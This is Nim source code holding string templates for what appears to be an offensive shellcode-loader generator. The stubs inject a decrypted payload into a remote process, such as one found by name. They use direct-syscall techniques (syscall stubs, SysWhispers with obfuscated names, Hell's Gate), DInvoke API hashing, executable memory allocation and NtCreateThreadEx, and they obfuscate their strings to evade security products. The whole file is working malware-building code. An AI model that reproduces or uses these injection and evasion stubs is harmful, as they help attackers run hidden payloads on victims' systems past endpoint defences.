let ShellcoderemoteinjectStub * = """
    
    when defined(DInvoke):
        let tProcess2 = MyGetCurrentProcessId()
        var pHandle2: HANDLE = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
    else:
        let tProcess2 = GetCurrentProcessId()
        var pHandle2: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)

    var 
        oldProtection: DWORD = 0
        status: NTSTATUS
        success: BOOL
    
    when defined(GetSyscallStub):
    
        when defined(DInvoke):
            MyVirtualAllocEx = cast[VirtualAllocEx_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), VirtualAllocEx_HASH, 0, FALSE))
            let syscallStub_NtOpenP = MyVirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
        else:
            let syscallStub_NtOpenP = VirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
    
        var syscallStub_NtAlloc: HANDLE = cast[HANDLE](syscallStub_NtOpenP) + cast[HANDLE](SYSCALL_STUB_SIZE)
        var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtAlloc) + cast[HANDLE](SYSCALL_STUB_SIZE)
        var syscallStub_NtCreate: HANDLE = cast[HANDLE](syscallStub_NtWrite) + cast[HANDLE](SYSCALL_STUB_SIZE)

        # define NtOpenProcess
        var NtOpenProcess: myNtOpenProcess = cast[myNtOpenProcess](cast[LPVOID](syscallStub_NtOpenP))
        VirtualProtect(cast[LPVOID](syscallStub_NtOpenP), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection);

        # define NtAllocateVirtualMemory
        let NtAllocateVirtualMemory = cast[myNtAllocateVirtualMemory](cast[LPVOID](syscallStub_NtAlloc))
        VirtualProtect(cast[LPVOID](syscallStub_NtAlloc), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection);

        # define NtWriteVirtualMemory
        let NtWriteVirtualMemory = cast[myNtWriteVirtualMemory](cast[LPVOID](syscallStub_NtWrite))
        VirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection);

        # define NtCreateThreadEx
        let NtCreateThreadEx = cast[myNtCreateThreadEx](cast[LPVOID](syscallStub_NtCreate))
        VirtualProtect(cast[LPVOID](syscallStub_NtCreate), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection);

        success = GetSyscallStub("NtOpenProcess", cast[LPVOID](syscallStub_NtOpenP))
        success = GetSyscallStub("NtAllocateVirtualMemory", cast[LPVOID](syscallStub_NtAlloc))
        success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))
        success = GetSyscallStub("NtCreateThreadEx", cast[LPVOID](syscallStub_NtCreate))

    when defined(SysWhispers):
        status = opqiwepoausdasdjl(&pHandle,PROCESS_ALL_ACCESS,&oa, &cid)

        echo obf("[*] opqiwepoausdasdjl: "), status

        status = oqiahsjynmxkla(pHandle, &ds, 0, &sc_size,MEM_COMMIT,PAGE_EXECUTE_READWRITE)
        echo obf("[*] opqiwepoausdasdjl: "), status
        var bytesWritten: SIZE_T

        status = oqiazasusjk(pHandle,ds,unsafeAddr friendlycode,sc_size-1,addr bytesWritten)

        echo obf("[*] oqiazasusjk: "), status
        echo obf("    \\-- bytes written: "), bytesWritten
        echo obf("")

        status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,pHandle,ds,NULL, FALSE, 0, 0, 0, NULL)

        status = zuatzuastdiasyy(tHandle)
        status = zuatzuastdiasyy(pHandle)

        echo success
    else:

        when defined(Hellsgate):
            if getSyscall(ntOpenTable):
                syscall = ntOpenTable.wSysCall
            else:
                echo obf("[-] Failed to find opcode for NtOpenProcess")
    
        status = NtOpenProcess(&pHandle,PROCESS_ALL_ACCESS,&oa, &cid)
        echo obf("[*] NtOpenProcess: "), status
    
        when defined(Hellsgate):
            if getSyscall(ntAllocTable):
                syscall = ntAllocTable.wSysCall
            else:
                echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")

        status = NtAllocateVirtualMemory(pHandle, &ds, 0, &sc_size,MEM_COMMIT,PAGE_EXECUTE_READWRITE)
        echo obf("[*] NtOpenProcess: "), status
        var bytesWritten: SIZE_T

        when defined(Hellsgate):
            if getSyscall(ntWriteTable):
                syscall = ntWriteTable.wSysCall
            else:
                echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")

        status = NtWriteVirtualMemory(
            pHandle, 
            ds, 
            unsafeAddr friendlycode, 
            sc_size-1, 
            addr bytesWritten)

        echo obf("[*] NtWriteVirtualMemory: "), status
        echo obf("    \\-- bytes written: "), bytesWritten
        echo obf("")
    
        when defined(Hellsgate):
            if getSyscall(ntCreateTable):
                syscall = ntCreateTable.wSysCall
            else:
                echo obf("[-] Failed to find opcode for NtCreateThreadEx")

        status = NtCreateThreadEx(
            &tHandle, 
            THREAD_ALL_ACCESS, 
            NULL, 
            pHandle,
            ds, 
            NULL, FALSE, 0, 0, 0, NULL)
    
        when defined(Hellsgate):
            if getSyscall(ntCloseTable):
                syscall = ntCloseTable.wSysCall
            else:
                echo obf("[-] Failed to find opcode for NtClose")

        status = NtClose(tHandle)
        status = NtClose(pHandle)

        echo success
   

when isMainModule:
     injectCreateRemoteThread(dectext)

"""

let ShellcoderemoteinjectStub_notepad * = """
proc injectCreateRemoteThread(friendlycode: openarray[byte]): void =

    var cid: CLIENT_ID
    var oa: OBJECT_ATTRIBUTES
    var pHandle: HANDLE
    var tHandle: HANDLE
    var ds: LPVOID
    var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)

    cid.UniqueProcess = tProcess.processID

"""

let ShellcoderemoteinjectStub_customprocfirst * = """

from winim import PROCESSENTRY32A,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,PROCESSENTRY32,Process32FirstA,Process32NextA

proc FindPidByName * (processName : string):DWORD =
    try:
        var 
            entry : PROCESSENTRY32A
            snapshot : HANDLE
            pid : DWORD = 0
        snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
        if snapshot != INVALID_HANDLE_VALUE:
            entry.dwSize = DWORD(sizeof(PROCESSENTRY32))
            if Process32FirstA(snapshot,addr entry):
                while Process32NextA(snapshot,addr entry):
                    pid = entry.th32ProcessID
                    if ($(entry.szExeFile).join()).contains(processName):
                        result = pid
    except: 
        echo obf("Process ID not found")

var processID: DWORD
"""

let ShellcoderemoteinjectStub_customprocID * = """
var found: bool = false
for m in remoteprocesses:
    if found == true: continue
    echo obf("Checking: ") & $m
    processID = FindPidByName(m)
    if (processID):
        found = true

echo obf("[*] Target Process: "), processID
var remoteProcID: DWORD = processID
"""

let ShellcoderemoteinjectStub_customprocthird * = """

proc injectCreateRemoteThread(friendlycode: openarray[byte]): void =

    var cid: CLIENT_ID
    var oa: OBJECT_ATTRIBUTES
    var pHandle: HANDLE
    var tHandle: HANDLE
    var ds: LPVOID
    var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)

    cid.UniqueProcess = processID

"""